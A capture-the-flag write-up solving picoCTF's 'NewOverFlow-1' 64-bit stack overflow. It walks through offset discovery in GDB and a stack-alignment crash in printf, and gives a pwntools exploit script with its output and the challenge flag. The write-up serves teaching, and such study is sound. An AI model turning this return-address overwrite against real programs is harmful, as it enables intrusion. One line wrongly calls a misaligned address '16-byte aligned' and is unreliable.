# NewOverFlow-1
Binary Exploitation, 200 points

## Description:
> Lets try moving to 64-bit, but don't worry we'll start easy. Overflow the buffer and change the return address to the flag function in this program.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
  vuln();
  return 0;
}


```


## Solution:

This should be a pretty simple overflow challenge. However, there's a twist.

First, we'll go over the steps that should have worked in a perfect world.

```console
root@kali:/media/sf_CTFs/pico/NewOverFlow-1# checksec.sh -f ./vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified                                                                                     Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   72 Symbols      No      0                                                                                             6./vuln
```

From the C file we can see that the program allocates a buffer of 64 bytes, and performs an unbound read into the buffer. Since there's no canary and no PIE enabled, we just have to overrun the return address of `vuln` with the address of `flag` and we should see the flag being printed.

We start by configuring the system to create a core dump for the upcoming crash:
```console
root@kali:/media/sf_CTFs/pico/NewOverFlow-1# ulimit -c unlimited
root@kali:/media/sf_CTFs/pico/NewOverFlow-1# echo ~/core/core_dump > /proc/sys/kernel/core_pattern
```

Then, we input to the program a 64-bit De-Bruijn sequence using the  `cyclic` utility to locate the overflow offset:
```console
root@kali:/media/sf_CTFs/pico/NewOverFlow-1# cyclic -n 8 100 | ./vuln
Welcome to 64-bit. Give me a string that gets you the flag:
Segmentation fault (core dumped)
```

We open the core dump with GDB to locate the faulting address:
```console
root@kali:/media/sf_CTFs/pico/NewOverFlow-1# gdb ./vuln ~/core/core_dump 2>/dev/null
GNU gdb (Debian 7.12-6+b1) 7.12.0.20161007-git
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./vuln...(no debugging symbols found)...done.
[New LWP 1805]
Core was generated by `./vuln'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x00000000004007e7 in vuln ()
gdb-peda$ bt
#0  0x00000000004007e7 in vuln ()
#1  0x616161616161616a in ?? ()
#2  0x616161616161616b in ?? ()
#3  0x616161616161616c in ?? ()
#4  0x00007f006161616d in ?? ()
#5  0x0000000000000000 in ?? ()
gdb-peda$ quit
```

We search for the faulting address in our cyclic sequence to get the overflow offset:
```console
root@kali:/media/sf_CTFs/pico/NewOverFlow-1# cyclic -n 8 -l 0x616161616161616a
72
```

We check what `flag`'s address is:
```console
root@kali:/media/sf_CTFs/pico/NewOverFlow-1# objdump -D ./vuln | grep "<flag>"
0000000000400767 <flag>:
```

And we perform the overflow:
```console
root@kali:/media/sf_CTFs/pico/NewOverFlow-1# python -c "print 'A'*72 + '\x67\x07\x40\x00\x00\x00\x00\x00'" | ./vuln
Welcome to 64-bit. Give me a string that gets you the flag:
picoCTF{local_fake_flag}
Segmentation fault (core dumped)
```

This works great locally (buffer overflow 101, they promised to "start easy"). However, if we run this on the server, we get a different response:
```console
dvdalt@pico-2019-shell1:/problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a$ python -c "print 'A'*72 + '\x67\x07\x40\x00\x00\x00\x00\x00'" | ./vuln
Welcome to 64-bit. Give me a string that gets you the flag:
Segmentation fault (core dumped)
```

We just get a segmentation fault - no flag!

Let's try to debug (we have to create a fake flag file since debugging a `setuid` program removes the extra permissions due to obvious reasons).

```
dvdalt@pico-2019-shell1:/problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a$ cd ~
dvdalt@pico-2019-shell1:~$ echo picoCTF{fake_remote_flag} > flag.txt
dvdalt@pico-2019-shell1:~$ gdb /problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a/vuln
GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a/vuln...(no debugging symbols found)...done.
(gdb) r <<< $( python -c "print 'A'*72 + '\x67\x07\x40\x00\x00\x00\x00\x00'")
Starting program: /problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a/vuln <<< $( python -c "print 'A'*72 + '\x67\x07\x40\x00\x00\x00\x00\x00'")
/bin/bash: warning: command substitution: ignored null byte in input
Welcome to 64-bit. Give me a string that gets you the flag:

Program received signal SIGSEGV, Segmentation fault.
buffered_vfprintf (s=s@entry=0x7f73768f7760 <_IO_2_1_stdout_>, format=format@entry=0x7fff815cbc28 "picoCTF{fake_remote_flag}\n", args=args@entry=0x7fff815cbb48) at vfprintf.c:2314
2314    vfprintf.c: No such file or directory.
```
Looks like we hit an exception in `printf`, while attempting to print the flag.

Here's the faulting command:

```
(gdb) set disassembly-flavor intel
(gdb) disas
Dump of assembler code for function buffered_vfprintf:
   0x00007f73765695d0 <+0>:     push   r14
   0x00007f73765695d2 <+2>:     push   r13
   0x00007f73765695d4 <+4>:     push   r12
   0x00007f73765695d6 <+6>:     push   rbp
   0x00007f73765695d7 <+7>:     push   rbx
   0x00007f73765695d8 <+8>:     mov    rbx,rdi
   0x00007f73765695db <+11>:    sub    rsp,0x2140
   0x00007f73765695e2 <+18>:    mov    rax,QWORD PTR fs:0x28
   0x00007f73765695eb <+27>:    mov    QWORD PTR [rsp+0x2138],rax
   0x00007f73765695f3 <+35>:    xor    eax,eax
   0x00007f73765695f5 <+37>:    mov    eax,DWORD PTR [rdi+0xc0]
   0x00007f73765695fb <+43>:    test   eax,eax
   0x00007f73765695fd <+45>:    jne    0x7f7376569770 <buffered_vfprintf+416>
   0x00007f7376569603 <+51>:    mov    DWORD PTR [rdi+0xc0],0xffffffff
   0x00007f737656960d <+61>:    lea    rax,[rsp+0x130]
   0x00007f7376569615 <+69>:    lea    rdi,[rsp+0x30]
   0x00007f737656961a <+74>:    mov    QWORD PTR [rsp+0x110],rbx
   0x00007f7376569622 <+82>:    mov    DWORD PTR [rsp+0xf0],0xffffffff
   0x00007f737656962d <+93>:    mov    DWORD PTR [rsp+0x30],0xfbad8004
   0x00007f7376569635 <+101>:   mov    QWORD PTR [rsp+0x8],rax
   0x00007f737656963a <+106>:   lea    rax,[rsp+0x2130]
   0x00007f7376569642 <+114>:   mov    QWORD PTR [rsp+0xb8],0x0
   0x00007f737656964e <+126>:   movq   xmm0,QWORD PTR [rsp+0x8]
   0x00007f7376569654 <+132>:   mov    QWORD PTR [rsp+0x60],rax
   0x00007f7376569659 <+137>:   mov    eax,DWORD PTR [rbx+0x74]
   0x00007f737656965c <+140>:   punpcklqdq xmm0,xmm0
   0x00007f7376569660 <+144>:   mov    DWORD PTR [rsp+0xa4],eax
   0x00007f7376569667 <+151>:   lea    rax,[rip+0x3890f2]        # 0x7f73768f2760 <_IO_helper_jumps>
=> 0x00007f737656966e <+158>:   movaps XMMWORD PTR [rsp+0x50],xmm0
   0x00007f7376569673 <+163>:   mov    QWORD PTR [rsp+0x108],rax
   0x00007f737656967b <+171>:   call   0x7f7376566390 <_IO_vfprintf_internal>
   0x00007f7376569680 <+176>:   mov    r12d,eax
   0x00007f7376569683 <+179>:   mov    r13d,DWORD PTR [rip+0x39225e]        # 0x7f73768fb8e8 <__libc_pthread_functions_init>
```

Let's take a look at the [`movaps` Reference](https://c9x.me/x86/html/file_module_x86_id_180.html):

> When the source or destination operand is a memory operand, the operand must be aligned on a 16-byte boundary or a general-protection exception (#GP) is generated.

However, in our case:
```
(gdb) p $rsp+0x50
$1 = (void *) 0x7fff815c94a8
(gdb) p ((unsigned int)$1) % 16
$3 = 8
```

This value is 16-byte aligned, so the program crashes. Looks like a compiler optimization is standing between us and the flag.

The solution was to call `main` again via the original payload, and then call `flag` as intended. Lucky for us, the stack was correctly aligned for such a call stack.

A `pwntools` script to automate the process:

```python
# First, generate a pwntools template using:
# pwn template --host 2019shell1.picoctf.com --user dvdalt --path /problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a/vuln

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

import os

if shell is not None:
    shell.set_working_directory(os.path.dirname(remote_path))

def send_payload(proc, payload):
    proc.sendlineafter("Welcome to 64-bit. Give me a string that gets you the flag: ", payload)


def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm core.* > /dev/null")
    proc = process(exe.path)
    payload = cyclic(200, n = exe.bytes)
    send_payload(proc, payload)
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n = exe.bytes )
    log.info("Overflow offset: {} ({}-byte architecture)".format(offset, exe.bytes))
    return offset


overflow_offset = get_overflow_offset()
log.info("flag() address: {}".format(hex(exe.symbols["flag"])))

io = start()
payload = fit({overflow_offset: exe.symbols["main"]}, filler = 'B')
log.info("Sending payload: \n{}".format(hexdump(payload)))

send_payload(io, payload)

payload = fit({overflow_offset: exe.symbols["flag"]}, filler = 'B')
log.info("Sending payload: \n{}".format(hexdump(payload)))

send_payload(io, payload)

print io.recvall()
```

Output:
```console
root@kali:/media/sf_CTFs/pico/NewOverFlow-1# python exploit.py
[*] '/media/sf_CTFs/pico/NewOverFlow-1/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Connecting to 2019shell1.picoctf.com on port 22: Done
[*] dvdalt@2019shell1.picoctf.com:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Opening new channel: 'pwd': Done
[+] Receiving all data: Done (13B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/tmp/tmp.6L3X1OVx47'
[+] Opening new channel: 'ln -s /home/dvdalt/* .': Done
[+] Receiving all data: Done (0B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a'
[+] Starting local process '/media/sf_CTFs/pico/NewOverFlow-1/vuln': pid 840
[*] Process '/media/sf_CTFs/pico/NewOverFlow-1/vuln' stopped with exit code -11 (SIGSEGV) (pid 840)
[+] Parsing corefile...: Done
[*] '/media/sf_CTFs/pico/NewOverFlow-1/core.840'
    Arch:      amd64-64-little
    RIP:       0x4007e7
    RSP:       0x7ffcf64ed5f8
    Exe:       '/media/sf_CTFs/pico/NewOverFlow-1/vuln' (0x400000)
    Fault:     0x616161616161616a
[*] Overflow offset: 72 (8-byte architecture)
[*] flag() address: 0x400767
[+] Starting remote process '/problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a/vuln' on 2019shell1.picoctf.com: pid 322295
[*] Sending payload:
    00000000  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│
    *
    00000040  42 42 42 42  42 42 42 42  e8 07 40 00  00 00 00 00  │BBBB│BBBB│··@·│····│
    00000050
[*] Sending payload:
    00000000  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│
    *
    00000040  42 42 42 42  42 42 42 42  67 07 40 00  00 00 00 00  │BBBB│BBBB│g·@·│····│
    00000050
[+] Receiving all data: Done (51B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 322295)

picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_d0b837aa}
```